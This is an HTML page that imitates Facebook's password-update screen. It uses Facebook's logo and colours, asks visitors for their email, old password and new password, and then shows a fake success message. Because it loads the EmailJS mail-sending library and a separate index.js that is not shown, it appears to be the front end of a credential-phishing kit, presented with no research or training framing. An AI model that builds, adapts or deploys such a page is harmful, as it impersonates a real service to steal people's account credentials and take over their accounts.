<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Update Password</title>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: #f0f2f5;
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-container {
      background-color: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 380px;
      text-align: center;
    }

    .login-container h2 {
      color: #1877f2;
      font-size: 24px;
      margin-bottom: 30px;
    }

    .login-container .fb-logo {
      width: 150px;
      margin-bottom: 30px;
    }

    .login-container input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }

    .login-container button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }

    .login-container button:hover {
      background-color: #145db2;
    }

    .success-message {
      display: none;
      font-size: 18px;
      color: green;
      text-align: center;
      margin-top: 20px;
    }

  </style>
</head>
<body>

  <div class="login-container" id="passwordBox">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="fb-logo">
    <h2>Update Your Password</h2>
    <form id="passwordForm">
      <input type="email" id="email" placeholder="Email" required>
      <input type="password" id="oldPassword" placeholder="Old Password" required>
      <input type="password" id="newPassword" placeholder="New Password" required>
      <button type="submit">Update Password</button>
    </form>
  </div>

  <div class="success-message" id="successMessage">
    <p>Password successfully updated!</p>
  </div>

  <script src="index.js"></script>
</body>
</html>
